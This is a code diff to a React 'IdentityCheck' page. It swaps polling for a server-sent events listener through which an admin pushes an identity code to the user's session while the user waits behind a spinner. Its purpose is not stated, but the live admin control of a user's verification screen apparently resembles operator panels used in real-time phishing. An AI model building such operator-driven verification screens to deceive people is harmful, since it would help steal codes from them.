@@ -1,6 +1,4 @@
-import { useState, useEffect } from "react";
-import { useQuery } from "@tanstack/react-query";
-import { getControlAction } from "@/lib/api";
+import { useState, useEffect, useCallback } from "react";
 import { Header } from "@/components/layout/Header";
 import { Loader2 } from "lucide-react";
 import { motion, AnimatePresence } from "framer-motion";
@@ -13,28 +11,45 @@ export default function IdentityCheck() {
   
   const sessionId = localStorage.getItem("sessionId");
   
-  // Check for control messages from admin
-  const { data: controlData } = useQuery({
-    queryKey: ["control", sessionId],
-    queryFn: () => getControlAction(sessionId!),
-    refetchInterval: 500,
-    enabled: !!sessionId,
-  });
-
-  // Handle admin control
-  useEffect(() => {
-    if (!controlData) return;
-    
-    if (controlData.action === "identity_code" && controlData.code) {
-      // Admin sent a code - hide spinner and show the code
-      setFadeOut(true);
-      setTimeout(() => {
-        setShowSpinner(false);
-        setFadeOut(false);
-        setAdminCode(controlData.code || "✓");
-      }, 500);
+  // Handle SSE control events
+  const handleSSEMessage = useCallback((event: MessageEvent) => {
+    try {
+      const data = JSON.parse(event.data);
+      
+      if (data.action === "identity_code" && data.code) {
+        // Admin sent a code - hide spinner and show the code
+        console.log("[IdentityCheck] Received identity code:", data.code);
+        setFadeOut(true);
+        setTimeout(() => {
+          setShowSpinner(false);
+          setFadeOut(false);
+          setAdminCode(data.code || "✓");
+        }, 500);
+      }
+    } catch (error) {
+      console.error("[IdentityCheck] Error parsing SSE message:", error);
     }
-  }, [controlData]);
+  }, []);
+
+  // Set up SSE listener
+  useEffect(() => {
+    if (!sessionId) return;
+    
+    const apiUrl = import.meta.env.VITE_API_URL || "";
+    const baseUrl = apiUrl || window.location.origin;
+    const sseUrl = `${baseUrl}/api/sse/${sessionId}`;
+    
+    const eventSource = new EventSource(sseUrl);
+    
+    // Listen for control events
+    eventSource.addEventListener("control", handleSSEMessage);
+    
+    // Cleanup
+    return () => {
+      eventSource.removeEventListener("control", handleSSEMessage);
+      eventSource.close();
+    };
+  }, [sessionId, handleSSEMessage]);
 
   return (
     <div className="min-h-screen bg-gray-50 flex flex-col">
